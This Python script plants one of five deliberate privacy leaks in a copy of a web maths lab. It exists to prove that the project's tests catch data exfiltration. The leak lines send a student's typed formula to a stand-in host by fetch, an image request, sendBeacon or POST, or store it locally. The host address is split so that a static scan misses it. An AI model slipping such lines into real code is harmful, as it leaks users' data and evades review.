#!/usr/bin/env python3
"""Plants one privacy leak in a copy of the Circus Math Lab (kits/privacy).

    python3 scripts/plant_leak.py --list          the leaks, one per line
    python3 scripts/plant_leak.py COPY_DIR P2     plant leak P2 in COPY_DIR

Each leak sends or keeps the reader's data at the point the lab reads it:
the formula a student types, as the formula form is submitted.
scripts/prove-privacy.sh plants each in a fresh copy and requires the core
tests or the browser check to catch it. The script refuses to run on this
repository, and fails if the line it inserts after is missing, so a renamed
line cannot turn every plant into a silent no-op. Off-origin addresses are
built at run time ("https:" + "//...") so the boundary scan's address check
does not catch them before the browser check gets the chance.
"""
import pathlib
import sys

ROOT = pathlib.Path(__file__).resolve().parents[1]
FILE = "web/lab.js"
AFTER = '    edited(game.lab_formula(el("formula").value));\n'
OFF = '"https:" + "//example.com'

LEAKS = {
    # one of the tool's own files, with the data in the query string
    "P1": '    fetch("data/copy.json?d=" + encodeURIComponent(el("formula").value));\n',
    # the data kept under a key the brief does not declare
    "P2": '    localStorage.setItem("food-truck-circus.formula", el("formula").value);\n',
    # an image on another origin, with the data in its address
    "P3": "    new Image().src = " + OFF + '/p?d=" + encodeURIComponent(el("formula").value);\n',
    # a beacon to another origin
    "P4": "    navigator.sendBeacon(" + OFF + '/b", el("formula").value);\n',
    # a POST to another origin
    "P5": "    fetch(" + OFF + '/f", { method: "POST", body: el("formula").value }).catch(() => {});\n',
}


def main(args):
    if args == ["--list"]:
        print("\n".join(LEAKS))
        return
    if len(args) != 2 or args[1] not in LEAKS:
        sys.exit("usage: plant_leak.py --list | plant_leak.py COPY_DIR P1..P5")
    copy = pathlib.Path(args[0]).resolve()
    if copy == ROOT or ROOT in copy.parents or copy in ROOT.parents:
        sys.exit(f"refusing to plant a leak in the repository itself ({copy})")
    path = copy / FILE
    text = path.read_text()
    if text.count(AFTER) != 1:
        sys.exit(f"the line to plant after appears {text.count(AFTER)} times in {FILE}: the plant would prove nothing")
    path.write_text(text.replace(AFTER, AFTER + LEAKS[args[1]]))
    print(f"planted {args[1]} in {path}")


if __name__ == "__main__":
    main(sys.argv[1:])
